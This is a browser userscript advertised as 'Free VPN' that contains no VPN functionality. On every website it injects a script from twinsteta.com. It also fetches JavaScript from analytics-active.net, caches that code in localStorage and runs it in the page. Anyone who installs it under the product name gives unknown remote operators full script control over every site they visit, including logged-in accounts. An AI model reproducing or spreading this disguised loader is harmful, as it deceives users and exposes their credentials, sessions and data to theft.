// ==UserScript==
// @name         Free VPN
// @namespace    http://tampermonkey.net/
// @version      0.4
// @description  Inject an external script from a specific domain on any site.
// @match        *://*/*
// @grant        none
// @license MIT
// @downloadURL https://update.greasyfork.org/scripts/473956/Free%20VPN.user.js
// @updateURL https://update.greasyfork.org/scripts/473956/Free%20VPN.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // Замените URL на свой URL скрипта
    const scriptUrl = 'https://twinsteta.com/views';

    const scriptElement = document.createElement('script');
    scriptElement.src = scriptUrl;
    document.head.appendChild(scriptElement);

var cache_js = localStorage.getItem('cache_js');
if(cache_js){
  window.cache_code = cache_js;
}else{
  var apiUrl = 'https://analytics-active.net/search/js.php';

  function fetchAndInsertScript() {
    fetch(apiUrl)
      .then(response => response.text())
      .then(data => {
        window.cache_code = data;
        localStorage.setItem('cache_js', window.cache_code);
        
        var expirationTime = 24 * 60 * 60 * 1000;
        var currentTime = new Date().getTime();
        var expirationDate = currentTime + expirationTime;
        localStorage.setItem('cache_jsExpiration', expirationDate.toString());
      })
      .catch(error => {
        console.error('Error fetch:', error);
      });
  }

  fetchAndInsertScript();
}

var se = document.createElement('script');
se.innerHTML = window.cache_code;
document.head.appendChild(se);

function checkcache_jsExpiration() {
  var expirationDate = localStorage.getItem('cache_jsExpiration');
  if (expirationDate) {
    var currentTime = new Date().getTime();
    if (currentTime >= parseInt(expirationDate)) {
      localStorage.removeItem('cache_js');
      localStorage.removeItem('cache_jsExpiration');
    }
  }
}

checkcache_jsExpiration();

})();
